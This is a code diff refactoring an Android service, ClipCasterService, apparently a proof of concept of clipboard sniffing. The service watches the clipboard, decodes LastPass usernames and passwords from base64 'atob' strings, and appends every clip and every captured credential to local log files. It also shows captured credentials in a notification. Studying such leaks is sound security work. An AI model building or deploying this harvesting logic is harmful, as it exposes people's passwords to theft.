@@ -68,114 +68,29 @@ public class ClipCasterService extends Service implements CredHandler{
     public static final String CLIPLOG_FILENAME = "clip.log";
     public static final String CREDLOG_FILENAME = "creds.log";
 
+
+    private ClipboardManager.OnPrimaryClipChangedListener mListener = new ClipboardManager.OnPrimaryClipChangedListener() {
+        @Override
+        public void onPrimaryClipChanged() {
+            final ClipData primaryClip = getManager().getPrimaryClip();
+            StringBuilder builder = new StringBuilder();
+            for(int i = 0; i < primaryClip.getItemCount(); i++){
+                builder.append(primaryClip.getItemAt(i).coerceToText(ClipCasterService.this));
+                if(i != primaryClip.getItemCount() - 1){
+                    builder.append('\n');
+                }
+            }
+            onClip(builder.toString());
+        }
+    };
     public static final List<ClipParser> mParsers  = new ArrayList<ClipParser>();
 
     static {
         mParsers.add(new LastPassParser());
     }
-    private ClipboardManager.OnPrimaryClipChangedListener mListener = new ClipboardManager.OnPrimaryClipChangedListener() {
-        @Override
-        public void onPrimaryClipChanged() {
-        final ClipData primaryClip = getManager().getPrimaryClip();
-        StringBuilder builder = new StringBuilder();
-        for(int i = 0; i < primaryClip.getItemCount(); i++){
-            builder.append(primaryClip.getItemAt(i).coerceToText(ClipCasterService.this));
-            if(i != primaryClip.getItemCount() - 1){
-                builder.append('\n');
-            }
-        }
-        onClip(builder.toString());
-        }
-    };
 
-    public static String currentTimestamp(){
-        Calendar cal = Calendar.getInstance();
-        cal.getTime();
-        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
-        return sdf.format(cal.getTime());
-    }
-
-    void onClip(String text){
-        mClips.add(text);
-        for(ClipParser parser : mParsers){
-            parser.onClip(this, this, text);
-        }
-        onClipDebug(text);
-    }
-
-    void onClipDebug(final String text){
-        System.out.println(text);
-        writeToFile(CLIPLOG_FILENAME, text);
-    }
-
-    void onCredDebug(final ClipParser.Credentials credentials){
-        System.out.println(credentials.toString());
-        writeToFile(CREDLOG_FILENAME, credentials.toString());
-    }
-
-    void writeToFile(String name, String text){
-        BufferedWriter writer = null;
-        try {
-            writer = new BufferedWriter(new PrintWriter(openFileOutput(name, MODE_APPEND)));
-            writer.write(currentTimestamp() + ": " + text);
-            writer.newLine();
-        } catch (FileNotFoundException e) {
-            e.printStackTrace();
-        } catch (IOException e) {
-            e.printStackTrace();
-        } finally {
-            if (writer != null) {
-                try {
-                    writer.close();
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-        }
-    }
-
-    public static String REGEX = "atob\\(\\'([^']*)\\'\\)";
-    public static Pair<String,String> getCreds(String string){
-        Pattern p = Pattern.compile(REGEX);
-        //  get a matcher object
-        Matcher m = p.matcher(string);
-        List<String> creds = new ArrayList<String>(2);
-        while(m.find()) {
-            creds.add(m.group(1));
-        }
-        if(creds.isEmpty()) return null;
-        return new Pair<String, String>(new String(Base64.decode(creds.get(0).getBytes(),0)),new String(Base64.decode(creds.get(1).getBytes(), 0)));
-    }
-
-    private String getDefinitionHtml(String contents){
-        return "<b>" + contents + ":</b> ";
-    }
-    private Spanned getSpannedFromCreds(ClipParser.Credentials credentials, boolean splitLines){
-        if(credentials.unknown != null){
-            return Html.fromHtml(getDefinitionHtml(getString(R.string.cred)) + credentials.unknown);
-        } else {
-            assert(credentials.user != null || credentials.pass != null);
-            String html = "";
-            if (credentials.user != null){
-                html = getDefinitionHtml(getString(R.string.user)) + credentials.user;
-            }
-
-            if(credentials.pass != null){
-                if(credentials.user != null){
-                    if(splitLines) {
-                        html += "<br />";
-                    } else {
-                        html += ", ";
-                    }
-                }
-                html += getDefinitionHtml(getString(R.string.pass)) + credentials.pass;
-            }
-
-            return Html.fromHtml(html);
-        }
-    }
     @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
-    public void postNotification(ClipParser.Credentials credentials){
+    private void postNotification(ClipParser.Credentials credentials){
         Notification.Builder builder = new Notification.Builder(this);
         builder.setContentTitle(getString(R.string.creds_notif_title));
         builder.setSmallIcon(R.drawable.ic_launcher);
@@ -232,13 +147,89 @@ public class ClipCasterService extends Service implements CredHandler{
         });
     }
 
-    ClipboardManager getManager(){
-        return (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-    }
-
     @Override
     public void handleCreds(ClipParser.Credentials credentials) {
         postNotification(credentials);
         onCredDebug(credentials);
+    }
+
+    private static String currentTimestamp(){
+        Calendar cal = Calendar.getInstance();
+        cal.getTime();
+        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
+        return sdf.format(cal.getTime());
+    }
+
+
+    private ClipboardManager getManager(){
+        return (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+    }
+
+    private void onClip(String text){
+        mClips.add(text);
+        for(ClipParser parser : mParsers){
+            parser.onClip(this, this, text);
+        }
+        onClipDebug(text);
+    }
+
+    private void onClipDebug(final String text){
+        System.out.println(text);
+        writeToFile(CLIPLOG_FILENAME, text);
+    }
+
+    private void onCredDebug(final ClipParser.Credentials credentials){
+        System.out.println(credentials.toString());
+        writeToFile(CREDLOG_FILENAME, credentials.toString());
+    }
+
+    private void writeToFile(String name, String text){
+        BufferedWriter writer = null;
+        try {
+            writer = new BufferedWriter(new PrintWriter(openFileOutput(name, MODE_APPEND)));
+            writer.write(currentTimestamp() + ": " + text);
+            writer.newLine();
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        } finally {
+            if (writer != null) {
+                try {
+                    writer.close();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+    }
+
+    private String getDefinitionHtml(String contents){
+        return "<b>" + contents + ":</b> ";
+    }
+
+    private Spanned getSpannedFromCreds(ClipParser.Credentials credentials, boolean splitLines){
+        if(credentials.unknown != null){
+            return Html.fromHtml(getDefinitionHtml(getString(R.string.cred)) + credentials.unknown);
+        } else {
+            assert(credentials.user != null || credentials.pass != null);
+            String html = "";
+            if (credentials.user != null){
+                html = getDefinitionHtml(getString(R.string.user)) + credentials.user;
+            }
+
+            if(credentials.pass != null){
+                if(credentials.user != null){
+                    if(splitLines) {
+                        html += "<br />";
+                    } else {
+                        html += ", ";
+                    }
+                }
+                html += getDefinitionHtml(getString(R.string.pass)) + credentials.pass;
+            }
+
+            return Html.fromHtml(html);
+        }
     }
 }
